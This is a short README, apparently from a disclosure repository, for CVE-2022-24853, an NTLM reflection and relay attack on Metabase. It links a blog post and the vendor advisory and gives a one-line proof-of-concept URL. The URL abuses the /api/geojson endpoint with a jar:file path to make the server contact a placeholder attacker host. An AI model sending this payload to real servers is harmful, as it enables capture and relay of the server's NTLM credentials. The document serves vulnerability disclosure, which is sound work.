# CVE-2022-24853
Metabase NTLM Reflection / Relay Attack [CVE-2022-24853](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2022-24853)

Blog Post about the finding: https://secure77.de/metabase-ntlm-relay-attack/

Github Security Advisory: https://github.com/metabase/metabase/security/advisories/GHSA-5cfq-582c-c38m


## POC
```plain
http://metabase-target-server.com/api/geojson?url=jar:file:\<attacker-ip>\test.txt!/
```


